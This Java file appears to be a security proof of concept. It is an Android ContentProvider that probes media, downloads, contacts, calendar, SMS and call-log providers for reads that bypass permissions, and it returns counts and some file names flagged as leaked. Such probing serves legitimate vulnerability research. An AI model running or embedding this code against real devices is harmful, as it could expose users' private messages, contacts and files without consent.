package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.ContentResolver;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class MediaAccessProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("media")) {
            probeMediaProvider(cursor);
        } else if (path != null && path.contains("downloads")) {
            probeDownloads(cursor);
        } else if (path != null && path.contains("contacts")) {
            probeContacts(cursor);
        } else if (path != null && path.contains("calendar")) {
            probeCalendar(cursor);
        } else if (path != null && path.contains("sms")) {
            probeSms(cursor);
        } else {
            probeMediaProvider(cursor);
            probeDownloads(cursor);
            probeContacts(cursor);
            probeCalendar(cursor);
            probeSms(cursor);
        }

        return cursor;
    }

    private void probeMediaProvider(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Try to query media without READ_EXTERNAL_STORAGE
        // On Android 13+ with scoped storage, should only see own files
        String[] mediaUris = {
            "content://media/external/images/media",
            "content://media/external/video/media",
            "content://media/external/audio/media",
            "content://media/external/file",
            "content://media/external/downloads",
        };

        for (String uriStr : mediaUris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, new String[]{"_id", "_display_name", "owner_package_name"},
                    null, null, "_id DESC");
                if (c != null) {
                    int count = c.getCount();
                    cursor.addRow(new Object[]{"media_" + u.getLastPathSegment(), "count=" + count});
                    if (count > 0) {
                        while (c.moveToNext() && c.getPosition() < 10) {
                            String name = c.getString(1);
                            String owner = c.getString(2);
                            cursor.addRow(new Object[]{"m_" + c.getPosition(),
                                owner + ": " + name});
                        }
                    }
                    c.close();
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"media_" + Uri.parse(uriStr).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }

        // Try cross-user media access via authority manipulation
        try {
            Uri u = Uri.parse("content://media/external_primary/images/media");
            Cursor c = cr.query(u, new String[]{"_id", "_display_name", "_data"},
                null, null, "_id DESC");
            if (c != null) {
                cursor.addRow(new Object[]{"media_primary", "count=" + c.getCount()});
                c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"media_primary", "ERR:" + truncate(e.getMessage())});
        }
    }

    private void probeDownloads(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();
        try {
            Uri u = Uri.parse("content://downloads/all_downloads");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"downloads_all", "ACCESSIBLE! count=" + c.getCount()});
                if (c.moveToFirst()) {
                    for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                        try {
                            cursor.addRow(new Object[]{"dl_col_" + c.getColumnName(i), c.getString(i)});
                        } catch (Exception ignored) {}
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"downloads_all", "ERR:" + truncate(e.getMessage())});
        }

        try {
            Uri u = Uri.parse("content://downloads/my_downloads");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"downloads_my", "count=" + c.getCount()});
                c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"downloads_my", "ERR:" + truncate(e.getMessage())});
        }
    }

    private void probeContacts(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Contacts requires READ_CONTACTS permission
        String[] contactUris = {
            "content://com.android.contacts/contacts",
            "content://com.android.contacts/raw_contacts",
            "content://com.android.contacts/data",
            "content://com.android.contacts/profile",
        };

        for (String uriStr : contactUris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    if (count > 0) {
                        cursor.addRow(new Object[]{"contacts_" + u.getLastPathSegment(),
                            "ACCESSIBLE! count=" + count + " CONTACTS_LEAKED!"});
                    } else {
                        cursor.addRow(new Object[]{"contacts_" + u.getLastPathSegment(), "count=0"});
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{"contacts_" + Uri.parse(uriStr).getLastPathSegment(), "DENIED"});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"contacts_" + Uri.parse(uriStr).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }
    }

    private void probeCalendar(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();
        try {
            Uri u = Uri.parse("content://com.android.calendar/events");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                int count = c.getCount();
                if (count > 0) {
                    cursor.addRow(new Object[]{"calendar", "ACCESSIBLE! count=" + count + " EVENTS_LEAKED!"});
                } else {
                    cursor.addRow(new Object[]{"calendar", "count=0"});
                }
                c.close();
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"calendar", "DENIED"});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"calendar", "ERR:" + truncate(e.getMessage())});
        }
    }

    private void probeSms(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();
        String[] smsUris = {"content://sms", "content://sms/inbox",
            "content://mms-sms/conversations", "content://call_log/calls"};

        for (String uriStr : smsUris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    int count = c.getCount();
                    if (count > 0) {
                        cursor.addRow(new Object[]{uriStr.replace("content://", ""),
                            "ACCESSIBLE! count=" + count + " DATA_LEAKED!"});
                    } else {
                        cursor.addRow(new Object[]{uriStr.replace("content://", ""), "count=0"});
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                cursor.addRow(new Object[]{uriStr.replace("content://", ""), "DENIED"});
            } catch (Exception e) {
                cursor.addRow(new Object[]{uriStr.replace("content://", ""),
                    "ERR:" + truncate(e.getMessage())});
            }
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
